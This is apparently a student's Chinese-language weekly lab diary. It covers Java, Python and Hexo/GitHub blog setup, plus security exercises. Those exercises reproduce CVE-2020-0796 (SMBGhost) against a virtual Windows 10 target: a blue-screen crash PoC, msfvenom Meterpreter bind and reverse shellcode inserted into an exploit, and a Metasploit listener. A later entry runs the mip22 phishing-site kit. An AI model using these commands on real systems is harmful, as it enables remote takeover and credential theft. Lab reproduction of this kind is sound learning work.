11.27 周一

一.安装JDK

二.完成Java环境变量的配置：

1.于物理机右击此电脑，点击属性，找到高级系统设置，选择高级，进入环境变量。

2.于系统变量中新建变量，输入变量名JAVA_HOME，变量值根据自己的jdk的安装路径填写为JDK的bin目录所在路径。

3.在系统变量里新建”classpath”变量，值为：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; 找到path变量添加变量值：%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin。

4.Window+R输入cmd，打开命令行，输入命令java -version，如下图所示则配置成功。

三.Python环境搭建：

1.输入python官网地址，进入官网点击Downloads选择Windows，进入此页面，找到3.6.4版本集，下载安装包。

2.运行安装包，勾选左下角Add python 3.6 to PATH，然后选择第二个自定义安装（Customize installation），其他选项默认，自定义安装路径，完成安装。

3.Windows+R然后输入cmd，打开命令行输入python，如下图所示安装完成

（安装路径不能出现中文）

11.28 周二

永恒之黑漏洞

1.打开VMware软件，创建虚拟机靶机Win10X64与虚拟机kali linux，关闭靶机防火墙

2.将压缩包CVE-2020-0796-Scanner粘贴至Win10。window+R打开一个命令行于命令行输入“ipconfig”查看Win10的ip,，解压并打开文件夹CVE-2020-0796-Scanner于路径栏输入“cmd”打开命令行。再输入“CVE-2020-0796-Scanner.exe”运行检测工具，输入靶机ip，查看靶机漏洞

3.打开kali虚拟机，将压缩包CVE-2020-0796-PoC-master粘贴至kali系统，解压并打开文件夹CVE-2020-0796-PoC-master，于文件夹空格处右键单击选择“在这里打开终端”进入命令行。

4.输入命令“sudo su”输入密码进入管理员状态。

5.输入命令“pip install ntlm_auth”加入安装包

6.输入命令“python3 CVE-2020-0796.py 靶机的ip地址”，对永恒之黑漏洞进行攻击，致使目标靶机出现蓝屏重启报错的现象。

11.29 周三

永恒之黑的另一种复现以及利用漏洞对靶机进行监听

1.打开VMware软件，创建虚拟机靶机Win10X64与虚拟机kali linux，关闭靶机防火墙

2.将压缩包CVE-2020-0796-Scanner粘贴至Win10。window+R打开一个命令行于命令行输入“ipconfig”查看Win10的ip地址192.168.138.129。,，解压并打开文件夹CVE-2020-0796-Scanner于路径栏输入“cmd”打开命令行。再输入“CVE-2020-0796-Scanner.exe”运行检测工具，输入靶机ip，查看靶机漏洞

3.下载漏洞利用工具，安装在kali中，在kali中利用MSF生成木马：
“msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -b ‘\x00’ -i 1 -f python ”

4.将生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD

5.于kali攻击机中exploit.py文件夹空白处右键，选择“在这里打开终端”，在打开的命令行输入以下命令使靶机蓝屏：python3 exploit.py -ip 192.168.138.129

6.于桌面打开终端输入以下命令使kali进入监听模式：msfconsole

7.输入以下命令使kali对靶机进行监听：
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost 靶机IP
set lport 生成木马时设置的端口 run

8.首次监听失败，重复运行蓝屏代码，再次监听，在没有报错的情况增加蓝屏攻击次数增加监听成功概率，直至监听成功

此次监听为正向链接，kali端链接靶机；还可以进行反向链接，靶机链接kali端，需要将部分命令修改：1.msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.129 LPORT=6666 -b ‘\x00’ -i 1 -f python ，此处ip端口为kali端ip位置。2.use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST kali端IP
set lport 生成木马时设置的端口

部分登录页面钓鱼网站的建立

1.于物理机打开代理，Windows+R输入cmd打开命令行，输入命令ipconfig查询物理机ip地址

2.打开kali，于桌面打开终端，输入sudo su，输入kali密码进入管理员模式

3.输入命令 vim /etc/proxychains4.conf编辑代理设置，下拉至最后一行，单机空处，按i键进入编辑模式，更改ip地址为物理机地址+代理端口的格式，ESC，输入：wq退出并保存代理设置。

4.继续输入proxychains4 git clone https://github.com/makdosx/mip22，下载mip22文件![image-20231202171737784](https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202171737784.png)

5.输入命令“chmod -R 777 mip22”复制mip22，“cd mip22”传送到mip22的位置，改写mip22文件的权限

6.找到mip22文件夹于空白处右键打开终端，输入命令“proxychains4 bash mip22.sh”，运行程序打开，根据提示数字，创建相应的钓鱼网站

11.30 周四

Github的创建

1.打开Win10虚拟机下载Git GMD与Node.js软件

2.注册git hub账号

3.打开c盘新建文件夹，重命名为boke，右键文件夹选择Open Git Bash here，依次输入以下代码等待下载完成：
npm install -g hexo-cli
hexo init blog
cd blog
hexo g
hexo new x
hexo g
hexo s

4.打开浏览器，以IP：端口（192.168.138.129:4000/）的形式搜索网页

5.在虚拟机中输入ctrl+c停止分享，依次输入以下命令：hexo clean；cd ~/.ssh；ssh-keygen -t rsa -C “注册git hub的邮件地址”，打开c盘用户文件夹，选择admin，选择.ssh文件，选择id_rsa以记事本打开，复制，粘贴至git hub的设置ssh keys中生成密钥。

6.输入命令“ssh -T git@github.com”，选择yes，

7.在blog文件栏打入cmd，输入命令npm install hexo-deployer-git –save

8.输入代码.git config –global user.name “xxx”// 你的github用户名，非昵称
git config –global user.email “xxx@qq.com“// 填写你的github注册邮箱
打开github网站，创建一个库

9.于blog文档的congig文件以记事本打开，添加标识的代码：

deploy:
type: git
repository: git@github.com:xxx/xxx.github.io.git
branch: main

保存，于github命令栏输入
hexo d -g命令，完成本地文件的上传。

Github主题的更换

1.打开库，此电脑，找到boke文件夹，打开文件夹右键blog文件夹，选择

2.打开浏览器，搜索hexo主页（需要开代理），找到主题，选择合适的主题复制下载方式，于打开的Git CMD中运行，下载主题，下载完成后输入代码hexo clean，再输入命令hexo d -g保存主题

3.打开自己的git hub网站（github的id.github.io）观察主题是否更换

12.1 周五

Github的编写

1.打开虚拟机，下载压缩包，完成程序Typora与PicGo的安装

2.对PicGo完成设置如下图所示，确定并设为默认图床，自定义域名的格式为“https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@分支（一般为main）/”

3.打开Typora，选择文件，偏好设置，点击图像，如图所示设置，路径为PigcGo的文件所在位置

4.验证图片上传选择，完成验证

5.利用Typora打开相应的文件即可编辑博客，编辑完成后保存，找到boke文件夹，打开文件夹右键blog文件夹，选择Open Git Bash here，输入代码”hexo d -g”,等待上传完毕，刷新自己的github即可。

6.下面介绍部分编辑博客的代码：

开启服务：hexo server 新建文章a：hexo new a（a可以为任意文章名）

新建草稿b：hexo new draft b 将草稿b成为文章：hexo publish b

发布页面c：hexo new page c 生成静态文章：hexo generate 或者是 hexo g

部署文章：hexo deploy 或者是 hexo d
